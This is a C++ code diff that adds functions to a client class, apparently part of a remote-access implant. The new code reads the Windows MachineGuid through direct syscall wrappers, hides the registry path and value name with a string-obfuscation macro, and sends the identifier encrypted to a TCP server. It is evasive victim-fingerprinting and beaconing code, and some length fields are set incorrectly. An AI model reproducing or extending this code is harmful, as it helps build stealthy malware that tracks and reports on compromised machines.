@@ -79,6 +79,45 @@ BOOL Client::Connect() {
 	return TRUE;
 }
 
+void Client::GetMachineGUID() {
+	OBJECT_ATTRIBUTES obj;
+	InitializeObjectAttributes(&obj, 0, 0, 0, 0);
+
+	std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Cryptography"));
+	std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());
+
+	UNICODE_STRING reg;
+	reg.Buffer = wide.data();
+	reg.Length = wide.size() * sizeof(wchar_t);
+	reg.MaximumLength = sizeof(reg.Buffer);
+
+	std::string hiddenName = std::string(HIDE("MachineGuid"));
+	std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());
+
+	UNICODE_STRING valueName;
+	valueName.Buffer = name.data();
+	valueName.Length = name.size() * sizeof(wchar_t);
+	valueName.MaximumLength = sizeof(valueName.Length);
+
+	obj.Length = sizeof(OBJECT_ATTRIBUTES);
+	obj.RootDirectory = NULL;
+	obj.ObjectName = &reg;
+	obj.SecurityDescriptor = NULL;
+	obj.SecurityQualityOfService = NULL;
+	obj.Attributes = OBJ_CASE_INSENSITIVE;
+
+	HANDLE key;
+	SysNtOpenKey(&key, GENERIC_READ, &obj);
+
+	char buffer[512];
+	u_long size;
+	SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
+	PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
+	std::wstring data = ( wchar_t* ) pk->Data;
+	std::string string = std::string(data.begin(), data.end());
+	this->MachineGUID = string;
+}
+
 BYTESTRING Client::MakeTCPRequest(ClientRequest req, BOOL encrypted) {
 
 	BOOL sent = encrypted ? SendEncryptedMessageToServer(this->TCPServerDetails, req) : SendMessageToServer(this->TCPServerDetails, req);
@@ -97,6 +136,15 @@ BOOL Client::SendComputerNameToServer() {
 
 	BIO* key = NetCommon::GetBIOFromString(this->Secrets.strPublicKey);
 	BOOL success = NetCommon::TransmitData(computerName, this->TCPSocket, TCP, NetCommon::_default, TRUE, key, FALSE);
+	BIO_free(key);
+	return success;
+}
+
+BOOL Client::SendMachineGUIDToServer() {
+	GetMachineGUID();
+	BYTESTRING guid = Serialization::SerializeString(this->MachineGUID);
+	BIO* key = NetCommon::GetBIOFromString(this->Secrets.strPublicKey);
+	BOOL success = NetCommon::TransmitData(guid, this->TCPSocket, TCP, NetCommon::_default, TRUE, key, FALSE);
 	BIO_free(key);
 	return success;
 }
